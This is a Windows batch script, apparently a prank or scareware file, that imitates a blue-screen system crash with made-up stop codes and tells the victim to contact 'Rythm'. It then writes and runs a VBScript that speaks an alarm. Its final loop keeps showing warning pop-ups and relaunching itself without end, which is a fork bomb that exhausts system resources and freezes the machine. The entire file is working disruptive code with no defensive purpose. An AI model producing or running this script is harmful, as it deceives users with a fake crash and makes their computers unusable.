@echo off
title SYSTEM FAILURE - CONTACT ADMINISTRATOR: Rythm
mode 1000
color 1f
cls
echo A problem has been detected and Windows has been shut down to prevent damage.
echo If this is the first time you've seen this Stop error screen, restart your computer.
echo If this screen appears again, follow these steps:
echo.
echo Check to make sure any new hardware or software is properly installed.
echo If problems continue, disable or remove any newly installed hardware or software.
echo Disable BIOS memory options such as caching or shadowing.
echo If you need to use Safe Mode to remove or disable components, restart your computer,
echo press F8 to select Advanced Startup Options, and then select Safe Mode.
echo.
echo Technical information:
echo *** STOP: 0x0000008E (0xC0000005, 0xBF804FBF, 0xA0000000, 0x00000000)
echo *** SYSTEM32.EXE - Address BF804FBF base at BF800000, DateStamp 3d6dd67c
echo.
echo Beginning dump of physical memory...
echo Physical memory dump complete.
echo Contact your system administrator: Rythm for further assistance.
timeout /t 10 >nul

:: Play error sound
echo Set oVoice = CreateObject("SAPI.SpVoice") > error.vbs
echo oVoice.Speak "Critical System Failure Detected!" >> error.vbs
start error.vbs

:: Infinite error popups
:loop
msg * "WARNING! Your system has experienced a fatal error! Contact Rythm immediately!"
start "" cmd /c %0
goto loop
